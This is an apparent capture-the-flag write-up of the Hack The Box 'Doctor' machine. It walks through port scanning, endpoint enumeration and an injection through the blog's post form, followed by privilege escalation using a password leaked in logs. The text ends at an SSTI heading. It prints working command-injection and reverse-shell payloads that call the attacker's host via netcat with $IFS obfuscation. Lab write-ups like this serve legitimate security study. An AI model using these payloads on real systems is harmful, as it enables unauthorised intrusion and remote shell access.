## Default Information
IP Address: 10.10.10.209\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our /etc/hosts file.

```
10.10.10.209    doctor.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.209 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-13 02:29:53 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8089/tcp on 10.10.10.209                                  
Discovered open port 80/tcp on 10.10.10.209                                    
Discovered open port 22/tcp on 10.10.10.209
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 8089	| SSL/HTTP | Splunkd httpd | Open |

### Whatweb

From the whatweb output on port 80, we are able to find another host, ```doctors.htb```

```
[ Email ]
	Extract email addresses. Find valid email address and
	syntactically invalid email addresses from mailto: link
	tags. We match syntactically invalid links containing
	mailto: to catch anti-spam email addresses, eg. bob at
	gmail.com. This uses the simplified email regular
	expression from
	http://www.regular-expressions.info/email.html for valid
	email address matching.

	String       : info@doctors.htb
```

We will then add this host to our /etc/hosts file

```
10.10.10.209    doctors.htb doctor.htb
```

### Gobuster
We will first use Gobuster to find the endpoints at http://doctor.htb on port 80. However, I was unable to find any output that catches my attention.

```
http://10.10.10.209:80/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess            (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.aspx            (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.jsp             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta                 (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.txt             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.html            (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.asp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.php             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.aspx       (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.asp             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.jsp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.asp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.aspx       (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.jsp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd            (Status: 403) [Size: 277]
http://10.10.10.209:80/about.html           (Status: 200) [Size: 19848]
http://10.10.10.209:80/blog.html            (Status: 200) [Size: 19848]
http://10.10.10.209:80/contact.html         (Status: 200) [Size: 19848]
http://10.10.10.209:80/css                  (Status: 301) [Size: 310] [--> http://10.10.10.209/css/]
http://10.10.10.209:80/departments.html     (Status: 200) [Size: 19848]
http://10.10.10.209:80/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.209/fonts/]
http://10.10.10.209:80/images               (Status: 301) [Size: 313] [--> http://10.10.10.209/images/]
http://10.10.10.209:80/index.html           (Status: 200) [Size: 19848]
http://10.10.10.209:80/index.html           (Status: 200) [Size: 19848]
http://10.10.10.209:80/js                   (Status: 301) [Size: 309] [--> http://10.10.10.209/js/]
http://10.10.10.209:80/server-status        (Status: 403) [Size: 277]
http://10.10.10.209:80/services.html        (Status: 200) [Size: 19848]

```

Next, we will use Gobuster to find the endpoints of https://doctor.htb at port 8089, but there are no interesting findings.

```
https://10.10.10.209:8089/robots.txt           (Status: 200) [Size: 26]
https://10.10.10.209:8089/robots.txt           (Status: 200) [Size: 26]
https://10.10.10.209:8089/services             (Status: 401) [Size: 130]
https://10.10.10.209:8089/v1                   (Status: 200) [Size: 2178]
https://10.10.10.209:8089/v4                   (Status: 200) [Size: 2178]
https://10.10.10.209:8089/v2                   (Status: 200) [Size: 2178]
https://10.10.10.209:8089/v3                   (Status: 200) [Size: 2178]
```

Lastly, we will use Gobuster to find the endpoints of http://doctors.htb. For this site, there are a few interesting endpoints such as /archive and /login, which we will discover in depth later.

```
http://doctors.htb/login                (Status: 200) [Size: 4204]
http://doctors.htb/archive              (Status: 200) [Size: 101]
http://doctors.htb/home                 (Status: 302) [Size: 245] [--> http://doctors.htb/login?next=%2Fhome]
http://doctors.htb/register             (Status: 200) [Size: 4493]
http://doctors.htb/account              (Status: 302) [Size: 251] [--> http://doctors.htb/login?next=%2Faccount]
http://doctors.htb/logout               (Status: 302) [Size: 217] [--> http://doctors.htb/home]
http://doctors.htb/reset_password       (Status: 200) [Size: 3493]
http://doctors.htb/server-status        (Status: 403) [Size: 276]
```

### Web-content discovery

Exploring http://doctors.htb/register, we discover a sign up page to register a user to login to the site. However, we realize that the user will only be valid for 20mins. 

![Sign up page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/signup.png)

On the /home page, we realize that we are able to create a new post, and the creation of this new post will be reflected on our /archive page.

![Creating new post](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/new_post.png)

![Page archive](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/archive.png)

Looking at the response at /archive, I figured out that the website might be vulnerable to an XXE injection, and decided to try an OOB XXE injection using the payload ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/test"> ]>```

![XXE Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/xxe_injection.png)

Next, we will try to do a code injection by modifying the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(id)"> ]>``` and the output is reflected on our server

![code injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/code_injection.png)
## Exploit
### Obtaining reverse shell

To obtain a reverse shell, we can modify the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(nc.traditional$IFS-c$IFS/bin/bash$IFS'10.10.16.5'$IFS'3000')"> ]>```

After obtaining the reverse shell, we will have to stabilize the shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000       
listening on [any] 3000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42332
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@doctor:~$ export TERM=xterm
export TERM=xterm
web@doctor:~$ stty cols 132 rows 34
stty cols 132 rows 34
web@doctor:~$ 
```

### Privilege Escalation to shaun

From the terminal, we are able to find that there are 2 users on this terminal, namely web and shaun. We are also able to know that the user flag lies in the user, Shaun. However, the current user does not have the privilege to read the user flag.

```
web@doctor:~/blog/flaskblog/users$ cd /home
cd /home
web@doctor:/home$ ls
ls
shaun  web
web@doctor:/home$ ls shaun
ls shaun
user.txt
web@doctor:/home$ cat shaun/user.txt
cat shaun/user.txt
cat: shaun/user.txt: Permission denied
web@doctor:/home$ 
```

From Linpeas, we are able to discover that we can access the log files, and the log files are exposing a possible password.

```
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"  
```

Afterwards, we will su into the Shaun with the password, Guitar123

```
web@doctor:/home$ su shaun
su shaun
Password: Guitar123

shaun@doctor:/home$
```

### Obtaining user flag

```
shaun@doctor:/home$ cat /home/shaun/user.txt
cat /home/shaun/user.txt
<Redacted user flag>
```
### Obtaining root flag

## Post-Exploitation
### SSTI

From the reverse shell output,  we realize that this website is running on Flask framework

```
web@doctor:~$ ls
ls
blog  blog.sh
web@doctor:~$ cd blog
cd blog
web@doctor:~/blog$ ls
ls
flaskblog  run.py
```
